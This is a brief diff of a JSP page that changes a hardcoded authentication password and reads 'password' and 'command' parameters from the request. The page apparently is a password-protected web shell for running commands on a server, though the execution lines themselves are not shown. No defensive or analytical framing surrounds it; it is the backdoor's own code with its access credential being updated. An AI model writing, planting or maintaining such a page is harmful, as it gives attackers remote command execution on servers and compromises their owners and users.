@@ -1,7 +1,7 @@
 <%@ page language="java" contentType="text/plain; charset=UTF-8" pageEncoding="UTF-8"%>
 <%
     // Hardcoded password for authentication
-    final String hardcodedPassword = "secure123";
+    final String hardcodedPassword = "TheHermitKingdom2024__";
 
     String password = request.getParameter("password");
     String command = request.getParameter("command");
